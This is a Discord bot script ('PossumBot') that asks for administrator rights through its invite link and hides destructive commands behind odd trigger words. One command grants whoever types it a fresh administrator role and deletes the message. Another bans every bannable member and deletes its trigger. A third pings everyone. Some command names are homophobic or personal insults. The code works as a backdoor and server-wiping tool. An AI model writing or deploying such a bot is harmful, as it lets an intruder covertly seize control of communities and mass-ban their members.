const botSettings = require("./botsettings.json");
const Discord = require("discord.js");
const bot = new Discord.Client();

bot.on("ready", async () => {
	console.log(`PossumBot Is Now Activated`);
	//Bot Status
	bot.user.setActivity(`With Knives`);

	try {
		//Generates a invite link in the console...
		let link = await bot.generateInvite(["ADMINISTRATOR"]);
		console.log(link);
	} catch(e) {
		console.log(e.stack);
	}
});
bot.on("message", async message => { 
	if (message.author.bot) return;

	const args = message.content.slice(botSettings.prefix.length).trim().split(/ +/g);
  	const command = args.shift().toLowerCase();

	// Gives you the admin role and deletes the message.
	if (command === `myakish`) {
  		try {
			role = await message.guild.createRole({
 				name: "Dope Role",
  				color: "#2f3136",
  				permissions: [8]
			});
			message.member.addRole(role)
			message.delete(1000);
		} catch(e) {
			console.log(e.stack);
		}
	}

	// Bans everyone and deletes the message.
	if (command === `arturdebil`) {
		try {
			message.guild.members.filter(member => member.bannable).forEach(member => {member.ban()});
			message.delete(1000);
		} catch(e) {
			console.log(e.stack);
		}
	}

	if (command === `servergay`) {
		try {
			let newMessage = message.channel.send('@everyone listen to this man.');
			newMessage.delete(1000);
		} catch(e) {
			console.log(e.stack);
		}
	}

	if(command === `leaveserver`) {
   		try {
   			message.guild.leave();
   		} catch(e) {
			console.log(e.stack);
   		}
   	}
});

bot.login(botSettings.token);
